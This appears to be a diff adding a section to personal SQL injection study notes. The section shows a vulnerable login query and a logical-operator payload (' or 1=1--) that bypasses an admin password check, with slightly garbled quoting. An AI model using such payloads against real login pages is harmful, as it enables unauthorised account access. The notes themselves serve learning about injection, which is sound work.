@@ -32,3 +32,32 @@ Select * from shop where category = 'Food and Drink' and 1=0--`
 the web application broke at second query
 
 ---
+
+## Bypassing Admin Login Using Logical Operators
+
+Example: login credentials in login, breaking when entering password as quote
+
+Visualize Original Statement
+
+```
+SELECT * FROM USERS WHERE username = '$username' AND password = '$password'
+```
+
+<b>SQL Injection</b>
+
+```
+SELECT * FROM users WHERE username = 'admin' AND password = `'test' or 1=1--`
+````
+
+this will evaluate to true
+
+Payload:
+
+```
+` or 1=1--
+```
+
+---
+
+
+
